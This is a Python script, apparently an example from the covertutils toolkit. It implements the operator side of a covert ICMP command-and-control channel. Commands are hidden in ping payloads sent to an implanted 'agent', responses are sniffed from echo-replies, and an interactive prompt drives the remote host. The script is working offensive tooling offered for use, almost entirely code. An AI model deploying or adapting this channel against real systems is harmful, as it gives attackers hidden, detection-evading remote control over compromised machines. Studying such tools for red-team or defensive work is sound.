#!/usr/bin/env python
from covertutils.handlers import ResponseOnlyHandler
from covertutils.orchestration import SimpleOrchestrator
from covertutils.prompts import TextPrompt

from scapy.all import sniff, IP, ICMP, Raw
from scapy.all import send as scapy_send

from threading import Thread
from time import sleep

from random import randint
from struct import pack
import time

import sys


agent_address = sys.argv[1]
passphrase = sys.argv[2]
delay_secs = float(sys.argv[3])
passphrase = "pass"


icmp_packets = []
icmp_seq = 1

#============================== Networking part ===========================
# The networking is handled by Python API. No 'covertutils' code here...

def add_icmp_packet( pkt ) :
	global icmp_packets
	icmp_packets.append( pkt )


def collect_icmp() :
	sniff( filter = "icmp[icmptype] == icmp-echoreply", prn = add_icmp_packet )


def get_icmp_timestamp( ) :
	return pack("<I", int(time.time()))


def recv( ) :
	global ip_to_sent
	while not icmp_packets :
		sleep(0.01)

	pkt = icmp_packets.pop(0)
	ret = str(pkt[Raw])[4:]			# remove the timestamp
	return ret


def send( raw_data ) :
	sleep( delay_secs )
	icmp_id = randint( 0, 65535 )
	ip_id = randint( 0, 65535 )
	pkt = IP( dst = agent_address, id = ip_id )/ICMP( type = "echo-request", id = icmp_id, seq = icmp_seq )/Raw( get_icmp_timestamp() + raw_data )
	scapy_send( pkt, verbose = False )


sniff_thread = Thread( target = collect_icmp )
sniff_thread.daemon = True
sniff_thread.start()
#==========================================================================


#============================== Handler Overriding part ===================


class Handler( ResponseOnlyHandler ) :

	def onMessage( self, stream, message ) :
		print
		print message
		global icmp_seq
		icmp_seq = 1
		# super( Handler, self ).onMessage( stream, message )


	def onChunk( self, stream, message ) :
		# print "[+] Got a Chunk"
		global icmp_seq
		if not message :	# Got a message part
			# print "Sent response"
			icmp_seq += 1
			self.queueSend( self.request_data, stream )
			super( Handler, self ).onMessage( stream, self.request_data  )
		# self.onMessage( stream, self.request_data )



	def onNotRecognised( self ) :
		# print "[!] Unrecognised"
		pass
#==========================================================================



#=============================Handler Creation=============================

orchestrator = SimpleOrchestrator( passphrase, tag_length = 2, out_length = 52, in_length = 52, reverse = True )

handler = Handler( recv, send, orchestrator )
handler.preferred_send = handler.sendAdHoc

#==========================================================================


#============================== Prompt Design part ========================
while True :
	try :
		prompt = TextPrompt( handler )
		prompt.cmdloop()
	except KeyboardInterrupt :
		print
		exit_input = raw_input("Really Control-C [y/N]? ")
		if exit_input == 'y' :
			print "Aborted by the user..."
			sys.exit(0)

#==========================================================================

#	Magic!
